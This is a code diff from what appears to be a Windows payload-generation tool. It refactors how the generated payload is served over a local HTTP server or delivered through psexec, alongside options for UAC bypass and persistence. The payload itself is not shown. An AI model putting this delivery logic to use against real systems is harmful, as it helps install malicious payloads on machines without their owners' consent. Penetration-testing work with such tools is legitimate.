@@ -16,7 +16,7 @@ try:
 except:
     iperror = True
 
-payload, payloadchoice, payloaddir, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE, payloadname = '', '', '/etc/winpayloads', 'n', 'n', 'n', ''
+payload, payloadchoice, payloaddir, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE, payloadname, payloadinexe_payloadnameshort = '', '', '/etc/winpayloads', 'n', 'n', 'n', '', None
 
 try:
     os.mkdir(payloaddir)
@@ -205,18 +205,7 @@ try:
     want_to_upload = raw_input(
         '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
     if want_to_upload.lower() == 'y' or want_to_upload == '':
-        if want_to_payloadinexe == 'y' and want_to_upload.lower() == 'y' or want_to_payloadinexe == 'y' and want_to_upload.lower() == '':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadnameshort.group(0)) + t.normal
-            a = multiprocessing.Process(
-                target=FUNCTIONS().ServePayload, args=(os.getcwd() + '/compiled',))
-            a.daemon = True
-            a.start()
-        elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadname) + t.normal
-            a = multiprocessing.Process(
-                target=FUNCTIONS().ServePayload, args=(payloaddir,))
-            a.daemon = True
-            a.start()
+        FUNCTIONS().DoServe(want_to_payloadinexe,want_to_upload,IP,payloadinexe_payloadnameshort,payloadname,payloaddir)
 
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
         FUNCTIONS().DoPsexec(payloaddir,payloadname)
